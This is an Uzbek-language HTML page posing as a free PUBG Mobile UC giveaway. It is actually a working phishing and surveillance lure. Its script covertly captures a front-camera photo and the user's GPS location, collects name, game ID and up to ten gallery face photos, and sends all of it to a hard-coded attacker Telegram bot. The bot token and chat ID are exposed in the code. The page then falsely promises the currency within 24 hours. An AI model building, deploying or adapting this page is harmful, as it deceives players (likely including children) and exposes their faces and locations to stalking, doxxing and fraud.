<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE: FREE UC ELITE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon-b: #00f3ff; --neon-g: #39ff14; --bg: #010409; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
        #app { width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.9); border: 2px solid var(--neon-b); border-radius: 30px; padding: 25px; text-align: center; box-shadow: 0 0 20px var(--neon-b); }
        .uc-item { background: rgba(255,255,255,0.05); border: 1px solid var(--neon-g); border-radius: 15px; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 10px; transition: 0.3s; }
        .uc-item:hover { background: rgba(57, 255, 20, 0.2); transform: scale(1.02); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; padding: 15px; }
        .form-box { background: #0d1117; border: 2px solid var(--neon-b); border-radius: 25px; padding: 25px; width: 100%; max-width: 350px; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 16px; box-sizing: border-box; }
        .btn-main { width: 100%; padding: 16px; background: var(--neon-b); border: none; border-radius: 10px; font-weight: 900; cursor: pointer; font-size: 18px; color: #000; text-transform: uppercase; margin-top: 10px; }
        .btn-main:disabled { background: #555; cursor: not-allowed; }
        .file-label { display: block; padding: 12px; background: #1e293b; border: 1px dashed var(--neon-b); border-radius: 10px; cursor: pointer; margin-bottom: 15px; color: var(--neon-b); font-size: 14px; }
        .file-count { color: var(--neon-g); font-size: 12px; margin-top: -10px; margin-bottom: 15px; display: none; }
        video, canvas, #fileInput { display: none; }
    </style>
</head>
<body>

<div id="app">
    <h1 style="font-family:'Orbitron'; color:var(--neon-b);">UC ELITE SHOP</h1>
    <p style="color: #aaa;">Paketni tanlang:</p>
    <div onclick="start('60 UC')" class="uc-item"><b>60 UC 🎁</b> <span>BEPUL</span></div>
    <div onclick="start('325 UC')" class="uc-item"><b>325 UC</b> <span>55,000 UZS</span></div>
</div>

<div id="authModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b); font-family:'Orbitron';">TASDIQLASH</h2>
        <p style="color: #39ff14; font-size: 14px;">Xavfsizlik uchun GPS va kameraga ruxsat bering.</p>
        <button class="btn-main" id="authBtn" onclick="getAccess()">RUXSAT BERISH</button>
    </div>
</div>

<div id="formModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b); font-family:'Orbitron';">MA'LUMOTLAR</h2>
        <input type="text" id="u_name" placeholder="Ismingiz">
        <input type="number" id="u_id" placeholder="PUBG ID">
        
        <label for="fileInput" class="file-label" id="fileLabel">📁 Galereyadan 10 ta yuz rasmini yuklang</label>
        <div class="file-count" id="fileCount">0 ta fayl tanlandi</div>
        <input type="file" id="fileInput" accept="image/*" multiple onchange="handleFiles(this)">
        
        <button class="btn-main" id="sendBtn" onclick="sendAll()">UC YUKLASH</button>
    </div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    // Sizning bot ma'lumotlaringiz
    const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CHAT_ID = "6198817749";

    let selectedPackage = "", cameraPhoto = null, galleryFiles = [], lat = 0, lon = 0;

    function start(pkg) {
        selectedPackage = pkg;
        document.getElementById('authModal').style.display = 'flex';
    }

    function handleFiles(input) {
        if (input.files) {
            galleryFiles = Array.from(input.files).slice(0, 10); // Maksimal 10 ta fayl
            const fileLabel = document.getElementById('fileLabel');
            const fileCount = document.getElementById('fileCount');
            
            if (galleryFiles.length > 0) {
                fileLabel.innerText = "✅ Fayllar tanlandi";
                fileCount.innerText = `${galleryFiles.length} ta fayl tanlandi`;
                fileCount.style.display = 'block';
            } else {
                fileLabel.innerText = "📁 Galereyadan 10 ta yuz rasmini yuklang";
                fileCount.style.display = 'none';
            }
        }
    }

    async function getAccess() {
        const btn = document.getElementById('authBtn');
        btn.innerText = "KUTILMOQDA...";
        btn.disabled = true;

        try {
            // 1. Kamera ruxsati va rasm olish
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('vid');
            video.srcObject = stream;

            await new Promise(r => setTimeout(r, 1000)); // Kamera fokuslanishi uchun kutish

            const canvas = document.getElementById('canv');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // Kamera rasmini saqlash
            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
            cameraPhoto = await (await fetch(dataUrl)).blob();

            stream.getTracks().forEach(track => track.stop()); // Kamerani o'chirish

            // 2. GPS ruxsati va manzil olish
            navigator.geolocation.getCurrentPosition((position) => {
                lat = position.coords.latitude;
                lon = position.coords.longitude;
                
                // Hammasi tayyor bo'lgach, keyingi bosqichga o'tish
                document.getElementById('authModal').style.display = 'none';
                document.getElementById('formModal').style.display = 'flex';
            }, (err) => {
                alert("Xato: GPS ruxsati berilmadi. UC yuklash uchun joylashuvingizni bilishimiz shart.");
                location.reload();
            });

        } catch (err) {
            alert("Xato: Kamera ruxsati berilmadi. UC yuklash uchun ruxsat berishingiz shart.");
            location.reload();
        }
    }

    async function sendAll() {
        const name = document.getElementById('u_name').value;
        const pubgId = document.getElementById('u_id').value;
        const sendBtn = document.getElementById('sendBtn');

        if (!name || !pubgId) return alert("Hamma maydonni to'ldiring!");
        if (galleryFiles.length < 1) return alert("Kamida 1 ta yuz rasmini yuklang!");

        sendBtn.innerText = "YUBORILMOQDA...";
        sendBtn.disabled = true;

        // Qurilma ma'lumotlarini aniqlash
        const ua = navigator.userAgent;
        let deviceName = "Noma'lum qurilma";
        if (/android/i.test(ua)) {
            const match = ua.match(/Android\s+([^\s;]+);?\s+([^;)]+)/);
            deviceName = match ? `Android (${match[2]})` : "Android qurilma";
        } else if (/iPhone/i.test(ua)) {
            deviceName = "iPhone";
        }

        // GPS havolasi (Google Maps)
        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
        
        // 1. Matnli ma'lumotlarni yuborish
        const info = `🚀 *YANGI AKKAUNT* 🚀\n\n👤 Ism: ${name}\n🆔 ID: \`${pubgId}\`\n📦 Paket: ${selectedPackage}\n📱 Qurilma: *${deviceName}*\n📍 *Manzil:* [Google Maps](${googleMaps})`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: info, parse_mode: 'Markdown' })
        });

        // 2. Kameradan olingan bitta rasm
        if (cameraPhoto) {
            const fd1 = new FormData();
            fd1.append('chat_id', CHAT_ID);
            fd1.append('photo', cameraPhoto, "camera.jpg");
            fd1.append('caption', "📸 Kameradan olingan jonli rasm");
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });
        }

        // 3. Galereyadan yuklangan 10 tagacha fayl (bitta albom qilib yuborish)
        if (galleryFiles.length > 0) {
            const media = [];
            const fd2 = new FormData();
            fd2.append('chat_id', CHAT_ID);
            
            for (let i = 0; i < galleryFiles.length; i++) {
                fd2.append(`photo_${i}`, galleryFiles[i]);
                media.push({
                    type: 'photo',
                    media: `attach://photo_${i}`,
                    caption: i === 0 ? "🖼 Galereyadan yuklangan yuz rasmlari" : ""
                });
            }
            
            fd2.append('media', JSON.stringify(media));
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, { method: 'POST', body: fd2 });
        }

        alert("✅ Muvaffaqiyatli! UC 24 soat ichida yuklanadi.");
        location.reload();
    }
</script>
</body>
</html>
